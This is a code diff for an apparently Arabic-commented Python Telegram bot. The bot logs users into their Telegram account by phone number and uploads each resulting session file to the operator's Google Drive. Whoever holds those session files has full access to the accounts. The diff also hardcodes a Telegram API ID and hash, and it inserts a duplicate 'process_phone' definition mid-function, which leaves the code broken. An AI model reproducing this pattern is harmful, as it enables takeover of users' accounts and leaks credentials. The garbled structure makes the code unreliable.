@@ -142,6 +142,25 @@ async def process_phone(update, context):
             except Exception as drive_error:
                 print(f"خطأ أثناء حذف الجلسة من Google Drive: {drive_error}")
 
+async def process_phone(update, context):
+    user_id = update.message.from_user.id
+    phone_number = update.message.text.strip()
+
+    # إعداد بيانات ملف الجلسة
+    session_file = f"/tmp/session_{user_id}.session"
+    api_id = 26466946
+    api_hash = '05d7144ca3c5f4594e40c535afb3bd5a'
+
+    print(f"مسار ملف الجلسة: {session_file}")
+    print(f"رقم المستخدم: {user_id}, رقم الهاتف: {phone_number}")
+
+    # بيانات ملف الجلسة على Google Drive
+    file_metadata = {
+        'name': f'session_{user_id}.session',
+        'parents': [FOLDER_ID],
+        'mimeType': 'application/octet-stream'
+    }
+
     # إنشاء جلسة جديدة
     client = TelegramClient(session_file, api_id, api_hash)
     clients[user_id] = client
@@ -154,14 +173,30 @@ async def process_phone(update, context):
             print("المستخدم مصرح له مسبقًا.")
             # رفع الجلسة إلى Google Drive
             try:
+                print(f"التحقق من وجود ملف الجلسة محليًا: {os.path.exists(session_file)}")
+                if not os.path.exists(session_file):
+                    print("خطأ: ملف الجلسة غير موجود محليًا قبل الرفع.")
+                    await update.message.reply_text("خطأ: ملف الجلسة غير موجود محليًا قبل الرفع.")
+                    return
+
+                print(f"بيانات الملف قبل الرفع: {file_metadata}")
                 upload_media = MediaFileUpload(session_file, resumable=True)
-                uploaded_file = drive_service.files().create(body=file_metadata, media_body=upload_media, fields='id').execute()
-                print(f"تم رفع الجلسة إلى Google Drive: File ID: {uploaded_file.get('id')}")
+                print("تم إنشاء MediaFileUpload.")
+
+                print("بدء عملية الرفع إلى Google Drive...")
+                uploaded_file = drive_service.files().create(
+                    body=file_metadata,
+                    media_body=upload_media,
+                    fields='id'
+                ).execute()
+                print(f"تم رفع الجلسة إلى Google Drive بنجاح: File ID: {uploaded_file.get('id')}")
+                await update.message.reply_text("تم تسجيل الدخول بنجاح! أرسل الآن رابط الملف لتحميله.")
+                return FILE
+
             except Exception as upload_error:
                 print(f"خطأ أثناء رفع الجلسة إلى Google Drive: {upload_error}")
-            
-            await update.message.reply_text("تم تسجيل الدخول بنجاح! أرسل الآن رابط الملف لتحميله.")
-            return FILE
+                await update.message.reply_text(f"خطأ أثناء رفع الجلسة إلى Google Drive: {upload_error}")
+                return PHONE
 
         # طلب رمز التحقق
         await client.send_code_request(phone_number)
